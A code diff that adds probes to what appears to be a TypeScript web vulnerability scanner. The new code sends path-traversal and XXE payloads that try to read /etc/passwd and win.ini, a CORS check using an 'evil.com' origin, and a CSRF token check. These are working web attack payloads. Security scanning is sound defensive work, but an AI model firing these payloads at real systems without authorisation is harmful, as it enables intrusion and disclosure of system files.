@@ -1938,6 +1938,59 @@ async function testParameterInjection(baseUrl: string, headers: Record<string, s
     }
   }));
 
+  // LFI / Path Traversal probe
+  const lfiPayloads = ['../../../etc/passwd', '..\\..\\..\\windows\\win.ini', '....//....//....//etc/passwd', '%252e%252e%252fetc%252fpasswd', '/etc/passwd%00', '..%2f..%2f..%2fetc%2fpasswd'];
+  const lfiParams = ['file','path','page','template','view','document','folder','directory','include','require','load','read','open','dir','filename','filepath','log','config','data'];
+  await Promise.all(lfiParams.slice(0,8).map(async (param) => {
+    for (const payload of lfiPayloads.slice(0,3)) {
+      try {
+        const testUrl = `${base}?${param}=${encodeURIComponent(payload)}`;
+        const res = await fetchURL(testUrl, 'GET', { 'Connection': 'close' }, undefined, timeout);
+        if (/root:x:0:0|root:x:0:0|daemon:x|bin:x|sys:x|nogroup|nobody|passwd|shadow|win.ini|\[fonts\]|\[extensions\]|\[mci extensions\]|for 16-bit app support/i.test(res.body)) {
+          vulns.push({ type: 'lfi', severity: 'critical', url: testUrl, description: `Local File Inclusion (LFI) confirmed — parameter "${param}" reads system files with "${payload}"`, evidence: res.body.slice(0,200), confidence: 'confirmed' });
+          return;
+        }
+      } catch {}
+    }
+  }));
+
+  // CORS misconfiguration probe
+  try {
+    const res = await fetchURL(base, 'GET', { 'Origin': 'https://evil.com', 'Connection': 'close' }, undefined, timeout);
+    const acao = res.headers['access-control-allow-origin'] || '';
+    const acac = res.headers['access-control-allow-credentials'] || '';
+    if (acao === 'https://evil.com' || acao === '*') {
+      if (acac === 'true' || acac === 'TRUE') {
+        vulns.push({ type: 'cors', severity: 'high', url: base, description: 'CORS misconfiguration — reflects arbitrary Origin and allows credentials, enabling cross-origin authenticated attacks', evidence: `Access-Control-Allow-Origin: ${acao}, Access-Control-Allow-Credentials: ${acac}`, confidence: 'confirmed' });
+      } else {
+        vulns.push({ type: 'cors', severity: 'medium', url: base, description: 'CORS misconfiguration — reflects arbitrary Origin without proper whitelist validation', evidence: `Access-Control-Allow-Origin: ${acao}`, confidence: 'confirmed' });
+      }
+    }
+  } catch {}
+
+  // CSRF token absence probe
+  try {
+    const res = await fetchURL(base, 'GET', { 'Connection': 'close' }, undefined, timeout);
+    const bodyLower = res.body.toLowerCase();
+    const hasForm = /<form[^>]*>/i.test(res.body);
+    const hasCsrfToken = /csrf|xsrf|authenticity_token|__requestverificationtoken|_token|nonce|anti-forgery/i.test(res.body);
+    const hasCookie = !!res.headers['set-cookie'];
+    if (hasForm && !hasCsrfToken && hasCookie) {
+      vulns.push({ type: 'csrf', severity: 'high', url: base, description: 'Potential CSRF vulnerability — form found without CSRF token and session cookie is set', evidence: 'Form tag present; no csrf/authenticity token detected', confidence: 'likely' });
+    }
+  } catch {}
+
+  // XXE probe (SOAP/XML endpoints)
+  if (headers['content-type']?.includes('xml') || body.includes('<?xml') || body.includes('<soap')) {
+    try {
+      const xxePayload = `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>`;
+      const res = await fetchURL(base, 'POST', { 'Content-Type': 'application/xml', 'Connection': 'close' }, xxePayload, timeout);
+      if (/root:x:0:0|bin:x|daemon:x|nogroup/i.test(res.body)) {
+        vulns.push({ type: 'xxe', severity: 'critical', url: base, description: 'XXE (XML External Entity) confirmed — external entity resolves to local system files', evidence: res.body.slice(0,200), confidence: 'confirmed' });
+      }
+    } catch {}
+  }
+
   return vulns;
 }
 
